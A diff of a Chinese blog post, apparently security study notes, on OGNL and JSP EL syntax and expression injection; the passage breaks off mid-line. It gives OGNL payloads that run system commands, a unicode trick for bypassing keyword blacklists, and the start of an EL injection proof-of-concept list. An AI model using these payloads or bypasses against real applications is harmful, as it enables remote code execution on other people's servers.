 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span></span><br><span class="line"><span class="meta">@java</span>.lang.Math<span class="meta">@abs(-111)</span></span><br></pre></td></tr></table></figure>
+
 <p>非原生类型对象：#</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#student.name</span><br><span class="line">#student.takingClasses(<span class="string">&quot;英语&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>简单对象：直接获取</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;string&quot;</span>.lenth</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
 <p>3、%符号的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p>
 <p>4、$在配置文件中引用OGNL表达式。</p>
-<h3 id="集合表达式：">集合表达式：</h3>
-<p>new创建实例：</p>
+<h3 id="集合表达式："><a href="#集合表达式：" class="headerlink" title="集合表达式："></a>集合表达式：</h3><p>new创建实例：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="string">&quot;testnew&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>{}和[]的用法：</p>
 <p>在OGNL中，可以用{}或者它的组合来创建列表、数组和map，[]可以获取下标元素。</p>
 <p>创建list：{value1,value2…}</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
 <p>创建数组：new type[]{value1,value2…}</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
 <p>创建map：#{key:value,key1:value1…}</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>,<span class="string">&quot;school&quot;</span>:<span class="string">&quot;tsinghua&quot;</span>&#125;[<span class="string">&quot;school&quot;</span>]</span><br></pre></td></tr></table></figure>
+
 <p>除了一些符号和集合，还支持Projection投影和Selection选择等，具体可参考官方文档：<a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a> 附录Operators部分。</p>
-<h3 id="命令执行调试分析">命令执行调试分析</h3>
-<p>通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：</p>
+<h3 id="命令执行调试分析"><a href="#命令执行调试分析" class="headerlink" title="命令执行调试分析"></a>命令执行调试分析</h3><p>通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使用runtime执行系统命令</span></span><br><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用processbuilder执行系统命令</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用反射调用runtime执行系统命令</span></span><br><span class="line">$&#123;(#runtimeclass=#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)).(#getruntimemethod=#runtimeclass.getDeclaredMethods([<span class="number">7</span>]).(#rtobj=#getruntimemethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>)).(#execmethod=#runtimeclass.getDeclaredMethods([<span class="number">14</span>]).(#execmethod.invoke(#rtobj,<span class="string">&quot;cmd&quot;</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用Jshell执行java代码(jdk9及以后)</span></span><br><span class="line"><span class="meta">@jdk</span>.jshell.Jshell<span class="meta">@create()</span>.eval(<span class="string">&#x27;code&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>关键字绕过</p>
 <p>假如题目中对用户的输入进行了关键字的黑名单(以new为例)，那么实际上我们可以使用unicode字符进行绕过:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;(\u006eew java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;</span>calc<span class="string">&quot;&#125;)).start()&quot;</span>;</span><br><span class="line">Ognl.getValue(str, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
-<p>那么假如存在一个正则表达式\u\d{4}，将对应的unicode先解析了一遍，再进行黑名单，还有方法绕过吗？实际上这里又存在一个trick，即\uxxxx中的u是可以写一个或多个的，具体原因在于ognl.JavaCharStream#readChar方法中:<br>
-<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713112336109-19a6d25f-f49f-4c34-816f-f8dc579b2c2c.png" alt=""><br>
-所以上述OGNL表达式可以改写为:</p>
+
+<p>那么假如存在一个正则表达式\u\d{4}，将对应的unicode先解析了一遍，再进行黑名单，还有方法绕过吗？实际上这里又存在一个trick，即\uxxxx中的u是可以写一个或多个的，具体原因在于ognl.JavaCharStream#readChar方法中:<br><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713112336109-19a6d25f-f49f-4c34-816f-f8dc579b2c2c.png"><br>所以上述OGNL表达式可以改写为:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;(\uuuuuuuuuuuuuuuu006eew java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;</span>calc<span class="string">&quot;&#125;)).start()&quot;</span>;</span><br><span class="line">Ognl.getValue(str, <span class="literal">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10482">https://xz.aliyun.com/t/10482</a></p>
 <p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/794/#0x03-ognl">https://paper.seebug.org/794/#0x03-ognl</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/168609.html">https://www.freebuf.com/vuls/168609.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/">https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/</a></p>
-<h2 id="EL简介">EL简介</h2>
-<p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p>
+<h2 id="EL简介"><a href="#EL简介" class="headerlink" title="EL简介"></a>EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p>
 <p>EL表达式主要功能如下：</p>
 <ul>
 <li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li>
-<li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如${user==null}；</li>
+<li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如${user&#x3D;&#x3D;null}；</li>
 <li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li>
 <li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li>
 </ul>
-<h3 id="基本语法">基本语法</h3>
-<h3 id="EL语法">EL语法</h3>
-<p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。例如，${ userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${ pageScope. userinfo}表示访问page范围中的userinfo变量。</p>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h3 id="EL语法"><a href="#EL语法" class="headerlink" title="EL语法"></a>EL语法</h3><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。例如，${ userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${ pageScope. userinfo}表示访问page范围中的userinfo变量。</p>
 <p>简单地说，使用EL表达式语法：${EL表达式}</p>
 <p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p>
 <p>扩展JSP代码的写法总结：</p>
 <ul>
-<li>JSP表达式：&lt;%=变量或表达式&gt;向浏览器输出变量或表达式的计算结果。</li>
+<li>JSP表达式：&lt;%&#x3D;变量或表达式&gt;向浏览器输出变量或表达式的计算结果。</li>
 <li>JSP脚本：&lt;%Java代码%&gt;执行java代码的原理：翻译到_jspService()方法中。</li>
 <li>JSP声明：&lt;%!变量或方法%&gt;声明jsp的成员变量或成员方法。</li>
 <li>JSP注释：&lt;%!–JSP注释–%&gt;用于注释JSP代码，不会翻译到Java文件中，也不会执行。</li>
 </ul>
-<h3 id="与-运算符">[ ]与.运算符</h3>
-<p>EL表达式提供.和[]两种运算符来存取数据。</p>
+<h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h3><p>EL表达式提供.和[]两种运算符来存取数据。</p>
 <p>当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[“My-Name”]}。</p>
 <p>如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。</p>
-<h3 id="变量">变量</h3>
-<p>EL表达式存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传&quot;&quot;。EL表达式的属性如下：</p>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>EL表达式存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下：</p>
 <table>
 <thead>
 <tr>
@@ -319,8 +316,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <th></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>Page</td>
 <td>PageScope</td>
 </tr>
@@ -336,8 +332,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <td>Application</td>
 <td>ApplicationScope</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>JSP表达式语言定义可在表达式中使用的以下文字：</p>
 <table>
 <thead>
@@ -346,8 +341,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <th><strong>文字的值</strong></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>Boolean</td>
 <td>true 和 false</td>
 </tr>
@@ -367,10 +361,8 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <td>Null</td>
 <td>null</td>
 </tr>
-</tbody>
-</table>
-<h3 id="操作符">操作符</h3>
-<p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p>
+</tbody></table>
+<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p>
 <table>
 <thead>
 <tr>
@@ -378,10 +370,9 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <th><strong>定义</strong></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>算术型</td>
-<td>+、-（二元）、*、/、div、%、mod、-（一元）</td>
+<td>+、-（二元）、*、&#x2F;、div、%、mod、-（一元）</td>
 </tr>
 <tr>
 <td>逻辑型</td>
@@ -389,7 +380,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 </tr>
 <tr>
 <td>关系型</td>
-<td>==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
+<td>&#x3D;&#x3D;、eq、!&#x3D;、ne、&lt;、lt、&gt;、gt、&lt;&#x3D;、le、&gt;&#x3D;、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
 </tr>
 <tr>
 <td>空</td>
@@ -399,10 +390,8 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <td>条件型</td>
 <td>A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
 </tr>
-</tbody>
-</table>
-<h3 id="隐式对象">隐式对象</h3>
-<p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p>
+</tbody></table>
+<h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p>
 <table>
 <thead>
 <tr>
@@ -410,13 +399,11 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <th><strong>定义</strong></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>pageContext</td>
 <td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，${pageContext.response}为页面的响应对象赋值。</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p>
 <table>
 <thead>
@@ -425,8 +412,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <th><strong>定义</strong></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>param</td>
 <td>将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式${param . name}相当于 request.getParameter (name)。</td>
 </tr>
@@ -450,8 +436,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <td>initParam</td>
 <td>将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p>
 <table>
 <thead>
@@ -460,8 +445,7 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <th><strong>定义</strong></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>pageScope</td>
 <td>将页面范围的变量名称映射到其值。例如，EL 表达式可以使用${pageScope.objectName}访问一个 JSP 中页面范围的对象，还可以使用${pageScope .objectName. attributeName}访问对象的属性。</td>
 </tr>
@@ -477,73 +461,72 @@ context上下文对象：context以MAP的结构、利用键值对关系来描述
 <td>applicationScope</td>
 <td>将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td>
 </tr>
-</tbody>
-</table>
-<h4 id="pageContext对象">pageContext对象</h4>
-<p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p>
+</tbody></table>
+<h4 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h4><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153806642-e746ebd6-90db-4829-9222-4c5e652d53fb.png" alt=""></p>
-<h4 id="Scope对象">Scope对象</h4>
-<p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153806642-e746ebd6-90db-4829-9222-4c5e652d53fb.png"></p>
+<h4 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h4><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p>
 <p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">pageContext.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;mi1k7ea_page&quot;</span>);  </span><br><span class="line">request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;mi1k7ea_request&quot;</span>);</span><br><span class="line">session.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;mi1k7ea_session&quot;</span>);</span><br><span class="line">application.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;mi1k7ea_application&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">                 &lt;/br&gt;</span><br><span class="line">                 requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">                                       &lt;/br&gt;</span><br><span class="line">                                       sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">                                                             &lt;/br&gt;</span><br><span class="line">                                                             applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153829067-32ff9b8b-a253-4bd2-ae74-51e2636c231e.png" alt=""></p>
-<h4 id="param和paramValues对象">param和paramValues对象</h4>
-<p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153829067-32ff9b8b-a253-4bd2-ae74-51e2636c231e.png"></p>
+<h4 id="param和paramValues对象"><a href="#param和paramValues对象" class="headerlink" title="param和paramValues对象"></a>param和paramValues对象</h4><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p>
 <p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p>
 <p>接下来的例子表明了如何访问request中的username参数：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;Accessing Request Param&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param[<span class="string">&quot;username&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153867755-8e21a12e-bbe3-4065-bb3e-4e4edefafabf.png" alt=""></p>
-<h4 id="header和headerValues对象">header和headerValues对象</h4>
-<p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p>
+
+<p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153867755-8e21a12e-bbe3-4065-bb3e-4e4edefafabf.png"></p>
+<h4 id="header和headerValues对象"><a href="#header和headerValues对象" class="headerlink" title="header和headerValues对象"></a>header和headerValues对象</h4><p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p>
 <p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：${header.user-agent}，或者${header[“user-agent”]}。</p>
 <p>接下来的例子表明了如何访问user-agent信息头：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;User Agent Example&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header[<span class="string">&quot;user-agent&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153889726-5e07cb9b-c981-4867-97e9-c8c43482d2a2.png" alt="">header对象返回单一值，而headerValues则返回一个字符串数组。</p>
-<h3 id="JSP中启动-禁用EL表达式">JSP中启动/禁用EL表达式</h3>
-<h3 id="全局禁用EL表达式">全局禁用EL表达式</h3>
-<p>web.xml中进入如下配置：</p>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153889726-5e07cb9b-c981-4867-97e9-c8c43482d2a2.png">header对象返回单一值，而headerValues则返回一个字符串数组。</p>
+<h3 id="JSP中启动-禁用EL表达式"><a href="#JSP中启动-禁用EL表达式" class="headerlink" title="JSP中启动&#x2F;禁用EL表达式"></a>JSP中启动&#x2F;禁用EL表达式</h3><h3 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h3><p>web.xml中进入如下配置：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="单个文件禁用EL表达式">单个文件禁用EL表达式</h3>
-<p>在JSP文件中可以有如下定义：</p>
+
+<h3 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h3><p>在JSP文件中可以有如下定义：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+
 <p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p>
-<h3 id="EL表达式注入漏洞">EL表达式注入漏洞</h3>
-<p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p>
+<h3 id="EL表达式注入漏洞"><a href="#EL表达式注入漏洞" class="headerlink" title="EL表达式注入漏洞"></a>EL表达式注入漏洞</h3><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p>
 <p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p>
-<h3 id="通用PoC">通用PoC</h3>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span 